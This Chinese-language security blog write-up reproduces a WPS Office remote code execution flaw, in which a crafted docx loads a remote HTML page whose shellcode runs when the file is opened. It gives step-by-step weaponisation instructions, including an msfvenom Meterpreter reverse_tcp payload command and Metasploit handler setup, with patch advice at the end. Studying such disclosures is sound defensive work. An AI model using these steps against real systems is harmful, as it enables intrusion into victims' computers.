## **免责声明**

>
> 本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为。
>
> 本文仅仅是作者的学习笔记，若存在错误请大家指点，若侵权请告知。

## 0x01 漏洞介绍

【威胁类型】：代码执行漏洞

【类型】：数据验证不恰当

 **漏洞描述** :：WPS Office for windows
的内置浏览器存在逻辑漏洞，攻击者可以利用该漏洞专门构造出恶意文档，受害者打开该文档并点击文档中的 URL 链接或包含了超级链接的图片时，存在漏洞版本的
WPS office 会通过内浏览器加载该链接，接着该链接中 js 脚本会通过 cefQucry 调用 WPS 端内
API下载文件并打开文件，进而导致恶意文件在受害者电脑上被运行。

## 0x02 漏洞环境/测绘指纹

WPS Office 2023个人版 < =11.1.0.15120

WPS Office 2019企业版 < =11.8.2.12085

## 0x03 漏洞原理

### 原理分析

比较靠谱解释是：在docx文档中嵌入一个远程链接，当使用wps去打开文档时会去请求这个链接，由于WPS内部浏览器存在漏洞，会调用系统的api去执行攻击者在html中构造的恶意代码从而导致RCE。

 **漏洞执行的流程是** ：

当受害者用wps打开伪造的恶意文件 **poc.docx** 时，poc.docx的 **webExtension1.xm** l文件就会被执行，然后访问
**http://clientweb.docer.wps.cn.cloudwps.cn/1.html** 下载 **1.html**
恶意文件；然后系统就会执行1.html的 **shellcode** 变量的恶意命令执行代码，如网上poc的打开计算器、还有getshell命令等。

![image-20230817145046181.png](https://image.3001.net/images/20230822/1692692535_64e47037ca5a5960e82ab.png!small)

### 恶意文件介绍

![image-20230817145138543.png](https://image.3001.net/images/20230822/1692692568_64e47058ad2597d2f9a6c.png!small)

 **恶意文件1：poc.docx**

![image-20230817145204179.png](https://image.3001.net/images/20230822/1692692574_64e4705e76739abbbe42a.png!small)

虽然改文件是.docx后缀，其真实文件类型是.zip，而该压缩文件包含多个文件。利用压缩软件打开poc.docx就能看到其“庐山真面目”，如下

![image-20230817145213609.png](https://image.3001.net/images/20230822/1692692584_64e4706833a4f0afd5b32.png!small)  
注意：不能直接右键 ⟶ 添加到压缩文件，也不能直接把文件拉到软件图标打开

 **打开方式1** ：右键 ⟶ 打开方式 ⟶ 找到自己的压缩软件打开⟶解压

 **打开方式2** ：先打开压缩软件，再在软件翻找到poc.docx，双击打开⟶解压

 **WebExtension1.xml**

![image-20230817145439950.png](https://image.3001.net/images/20230822/1692692599_64e47077f21883f4c639b.png!small)  
用压缩软件打开poc.docx后，到..\poc\poc\word\webExtensions目录下可以看到webExtension1.xml文件，该文件绑定了访问恶意服务器的域名，即写了（访问）下载恶意文件的链接（
**红框部分**
）。当受害者用wps打开poc.docx时，其电脑就会访问http://clientweb.docer.wps.cn.cloudwps.cn/1.html下载
**1.html** 恶意文件。

![image-20230817145457736.png](https://image.3001.net/images/20230822/1692692611_64e4708301be23e00fe50.png!small)

 **恶意文件2：1.html**

1.html是执行恶意命令的文件。其中执行的恶意代码，保存在 **shellcode** 变量中。

![image-20230817145534353.png](https://image.3001.net/images/20230822/1692692623_64e4708f72dc940114acb.png!small)

## 0x04 POC/EXP/漏洞利用

漏洞复现WPS Office版本：11.1.0.12300-release

 **注意** ：即使有的WPS有这个漏洞，但是复现的windows系统不同，复现结果也是不一样的。

![image-20230817145616058.png](https://image.3001.net/images/20230822/1692692635_64e4709b08370a63147c2.png!small)

### POC复现

 **效果** ：在本地弹出计算器

![image-20230817145710285.png](https://image.3001.net/images/20230822/1692692644_64e470a46b5badb4bbeab.png!small)

 **步骤1：域名绑定**

编辑C:\Windows\System32\drivers\etc\hosts文件，将域名clientweb.docer.wps.cn.cloudwps.cn绑定到本地127.0.0.1。（**这里是以本地搭建恶意服务器）

 **疑问：黑客不可能自己到靶机上修改host文件吧，那他是如何利用的呢？**

 **网上一些回答**
：在docx文档中嵌入一个远程链接，当使用wps去打开文档时会去请求这个链接，由于WPS内部浏览器存在漏洞，会调用系统的api去执行攻击者在html中构造的恶意代码从而导致RCE。

 **个人猜想**
：由于漏洞触发需让域名规则满足clientweb.docer.wps.cn.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。
**那么黑客实际应用时，是否可以不用执行该一步？他可以自己搭建恶意服务器，在poc.docx的WebExtension1.xml放上自己的恶意服务器即可.**  
![image-20230817150027757.png](https://image.3001.net/images/20230822/1692692699_64e470dbc404532a3a41f.png!small)

 **步骤2：启动的http服务**

 **方式1** :在1.html所在目录下用python起一个http服务

l **python -m http.server 80 # python3版本使用**

l **python -m SimpleHTTPServer 80 #python2版本使用**

如果开启80端口报错（如下图. 用80端口启动报错），可能是因为80端口被占用所导致的，可以开启其他端口，如8080端口（图. 用8080端口启动）。

![image-20230817150235426.png](https://image.3001.net/images/20230822/1692692752_64e47110f06dfbd5a35ca.png!small)

图. 用80端口启动报错

![image-20230817150250866.png](https://image.3001.net/images/20230822/1692692763_64e4711b40e06a8abd176.png!small)

图. 用8080端口启动

注意，如果使用其他端口启动，需要修改webExtension1.xml文件  
![image-20230817150302863.png](https://image.3001.net/images/20230822/1692692774_64e4712632d450153a6a6.png!small)

 **方式2：**

把poc放进PhpStudy的环境里面，但一定是根目录，然后启动PhpStudy。

![image-20230817150324698.png](https://image.3001.net/images/20230822/1692692785_64e47131cf944b4ee5cd1.png!small)

 **步骤3：执行poc**

用wps打开poc.docx  
![image-20230817150350250.png](https://image.3001.net/images/20230822/1692692800_64e471404cfd93075068d.png!small)

### EXP：利用CS进行getshell

 **【环境】**

Kail：（eth0）192.168.91.128

Window10：（Ethernet0）192.168.91.129

![image-20230817150409683.png](https://image.3001.net/images/20230822/1692692820_64e47154e346c38625a3f.png!small)

 **步骤1：绑定域名**

将域名绑定kali的ip。

![image-20230817150447734.png](https://image.3001.net/images/20230822/1692692829_64e4715d2c2443401d378.png!small)

 **步骤2：构造poc.docx**

解压poc.docx，然后找到\word\webExtensions\webExtensions1.xml，修改其中的url，这里用8080端口，避免与80端口的服务碰撞。

![image-20230817150515910.png](https://image.3001.net/images/20230822/1692692840_64e47168d903397d6279f.png!small)

保存后再将解压出来的文件重新打包成poc.zip，并修改后缀为docx，得到新的poc.docx。

 **步骤3：构造1.html**

l CS创建一个监听器

![image-20230817150549054.png](https://image.3001.net/images/20230822/1692692850_64e47172f216c23b42dd6.png!small)

 **生成一个C#的payload**

![image-20230817150623140.png](https://image.3001.net/images/20230822/1692692861_64e4717d2ef428a2b13e7.png!small)

将payload内容写入到1.html的shellcode变量里，得到新的1.html文件，1.html要放到kali里。

![image-20230817150647067.png](https://image.3001.net/images/20230822/1692692871_64e4718714a39d39c953b.png!small)

 **步骤4：启动http服务**

在kali的1.html目录下用python启动http服务`python -m http.server 8080`

 **步骤5：反弹shell**

 **Win10打开新的poc.docx**

![image-20230817150804168.png](https://image.3001.net/images/20230822/1692692882_64e47192d8979c9aaeccd.png!small)

 **Kali接收到请求服务**

![image-20230817150821773.png](https://image.3001.net/images/20230822/1692692887_64e471977c7030680af5c.png!small)

 **win系统上线CS**

![image-20230817150845091.png](https://image.3001.net/images/20230822/1692692915_64e471b357006b238df2e.png!small)

### EXP：利用MSF进行getshell

 **注意：其他文件复用 “EXP：利用CS进行getshell”的文件。**

 **步骤1：构造1.html**

MSF生成一个C#后门

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.91.128 LPORT=4444
-f csharp > shellcode.cs`

![image-20230817150940143.png](https://image.3001.net/images/20230822/1692692928_64e471c040717154ff1ac.png!small)

![image-20230817150952512.png](https://image.3001.net/images/20230822/1692692965_64e471e5a3155b6000172.png!small)

将shellcode.cs的变量值（红框）替换到1.html的shellcode值

![image-20230817151009031.png](https://image.3001.net/images/20230822/1692692975_64e471ef1a25f241cd690.png!small)

替换1.html的shellcode值

![image-20230817151024917.png](https://image.3001.net/images/20230822/1692692984_64e471f809b32ffc7b7d4.png!small)

 **步骤2：MSF设置exploit并监听**

`# msfconsole`

`msf6 > use exploit/multi/handler`

`msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp`

`msf6 exploit(multi/handler) > set lhost 192.168.91.128`

`msf6 exploit(multi/handler) > set lport 4444`

`msf6 exploit(multi/handler) > run`

![image-20230817151117209.png](https://image.3001.net/images/20230822/1692693011_64e472138056837134fc7.png!small)

 **步骤3：启动http服务用来捕获请求**

`python3 -m http.server 8080`

![image-20230817151137873.png](https://image.3001.net/images/20230822/1692693022_64e4721eeb641777ec375.png!small)

 **步骤4：触发shell**

Win10打开poc.docx

Win10请求了Kali上的1.html

![image-20230817151202701.png](https://image.3001.net/images/20230822/1692693030_64e472262ba2d40982541.png!small)

MSF反弹到shell

![image-20230817151220722.png](https://image.3001.net/images/20230822/1692693036_64e4722c7225e479cef26.png!small)

## 0x05 漏洞修复与防护

 **修复**

1.把WPS升级到最新版本

2.到官网下载补丁进行修复。、官方已发布相关补丁，如果您在使用 WPS office
的企业版请尽快联系官方技术工程师或客服获取最新版本，并确保企业版升级到11.8.2.12085;如果您使用的是 WPS ffice 个人版，请通过
WPS官网 https: //www.wps.cn 获取最新版本进行升级

 **防护**

1、请不要随意打开 PPS、PPSX、PPT、PPTX、DOC、DOCX、XLSXLSX 文档

2、请勿随意点击 PPS、PPSX、PPT、PPTX、DOC、DOCX、XLS、XLSX文档中的 URL 链接或带 URL 超级链接的图片或视频等

3、如果使用 WPS 打开 PDF 文件，请勿随意点击 PDF 中的 URL 链接或超级链接

 **参考文章** ：https://mp.weixin.qq.com/s/QdftHvdmXc5Id5YBOuPJ3g

